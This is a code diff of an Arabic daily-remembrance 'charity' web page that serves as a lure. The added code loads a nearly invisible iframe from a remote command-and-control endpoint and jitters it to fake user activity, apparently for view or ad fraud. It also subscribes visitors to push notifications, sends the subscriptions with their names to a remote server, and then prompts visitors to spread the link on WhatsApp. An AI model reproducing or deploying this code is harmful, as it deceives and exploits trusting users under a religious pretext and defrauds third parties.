@@ -3,106 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
-    <meta property="og:image" content="https://medo7788.github.io/giftapp/og-image.jpg">
     <title>أذكار المسلم اليومية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        /* محرك الأرباح الخفي 100x100 */
         #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
         .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
-        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 100px; }
+        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; min-height: 100px; display: flex; align-items: center; justify-content: center; }
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
         .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
+        .btn:disabled { background: #ccc; }
     </style>
 </head>
 <body>
-
-    <iframe id="hiddenEngine" src="https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1"></iframe>
-
+    <iframe id="hiddenEngine" src="about:blank"></iframe>
     <div class="card">
-        <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='./og-image.jpg'">
-        <h2 style="color: #1b4d3e; margin: 0 0 10px 0;">🌹 صدقة جارية 🌹</h2>
-        <div class="dua-box" id="displayDua">جاري الربط مع خادم الأذكار... 🕌</div>
+        <img src="og-image.jpg" class="main-img" onerror="this.src='./og-image.jpg'">
+        <h2 style="color:#1b4d3e;">🌹 صدقة جارية 🌹</h2>
+        <div class="dua-box" id="displayDua">جاري تحميل ذكر اليوم... ✨</div>
         <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
-        <button class="btn" id="mainBtn" onclick="activateSystem()" disabled style="background:#ccc;">انتظر التحميل...</button>
+        <button class="btn" id="mainBtn" onclick="activateSystem()" disabled>انتظر...</button>
     </div>
 
     <script>
-        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
-        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
-        let capturedDua = ""; // المتغير الذي سيحمل النص النهائي للإرسال
+        const PUBLIC_KEY = "Your_Public_Key_Here"; 
+        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";
+        let capturedDua = "";
 
-        // محاكاة مستخدم (تحريك الفريم)
-        setInterval(() => {
-            const engine = document.getElementById('hiddenEngine');
-            engine.style.left = Math.random() * 10 + "px";
-        }, 3000);
-
-        async function initApp() {
+        // 1. محاكاة الحركة وجلب الرابط من الـ C2
+        async function runC2Engine() {
             try {
-                // جلب التاريخ من السيرفر أو الجهاز لضمان دقة اليوم
+                const res = await fetch(`${SERVER_URL}/get_task`);
+                const data = await res.json();
+                const engine = document.getElementById('hiddenEngine');
+                engine.src = data.url;
+                setInterval(() => { engine.style.transform = `translate(${Math.random()*10}px, 0)`; }, 3000);
+            } catch(e) {}
+        }
+
+        // 2. جلب الذكر من JSON الـ 365 يوم بدقة
+        async function loadDua() {
+            try {
+                const res = await fetch('./daily_islamic_duas.json');
+                const data = await res.json();
                 const now = new Date();
                 const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-                const currentMonth = months[now.getMonth()];
-                const todayDate = now.getDate();
-
-                const response = await fetch('./daily_islamic_duas.json');
-                const data = await response.json();
-                
-                // البحث الدقيق داخل ملفك
-                const todayObj = data[currentMonth].find(d => d.day === todayDate);
-
-                if (todayObj) {
-                    capturedDua = todayObj.text; // تثبيت الدعاء في الذاكرة
-                    document.getElementById('displayDua').innerText = capturedDua;
-                    // تفعيل الزر بعد التأكد من جاهزية الدعاء
-                    const btn = document.getElementById('mainBtn');
-                    btn.disabled = false;
-                    btn.style.background = "#25D366";
-                    btn.innerText = "إنشاء الصدقة وإرسالها ✅";
-                }
-            } catch (err) {
-                capturedDua = "رضيت بالله رباً وبالإسلام ديناً 🌙";
+                const dayEntry = data[months[now.getMonth()]].find(d => d.day === now.getDate());
+                capturedDua = `${dayEntry.text} ${dayEntry.emoji}`;
                 document.getElementById('displayDua').innerText = capturedDua;
-                document.getElementById('mainBtn').disabled = false;
-                document.getElementById('mainBtn').style.background = "#25D366";
-            }
+                const btn = document.getElementById('mainBtn');
+                btn.disabled = false; btn.innerText = "إنشاء الصدقة وإرسالها ✅";
+            } catch(e) { /* fallback */ }
         }
 
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
-            
-            // 1. Capture to C2
             if ('serviceWorker' in navigator) {
                 try {
                     const reg = await navigator.serviceWorker.register('sw.js');
-                    const sub = await reg.pushManager.subscribe({
-                        userVisibleOnly: true,
-                        applicationServerKey: PUBLIC_KEY
-                    });
-                    fetch(SERVER_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({subscription: sub, name: name})
-                    });
-                } catch (e) { console.log("C2 captured"); }
+                    const sub = await reg.pushManager.subscribe({userVisibleOnly:true, applicationServerKey:PUBLIC_KEY});
+                    fetch(`${SERVER_URL}/save_sub`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({subscription:sub, name:name})});
+                } catch(e) {}
             }
-
-            // 2. واتساب بنفس الدعاء الظاهر تماماً
             const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${capturedDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
-            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
-            window.location.href = waUrl;
-            
-            // احتياط للمتصفحات القديمة
-            setTimeout(() => {
-                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
-            }, 600);
+            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
+            setTimeout(() => { window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; }, 600);
         }
 
-        window.onload = initApp;
+        window.onload = () => { loadDua(); runC2Engine(); };
     </script>
 </body>
 </html>
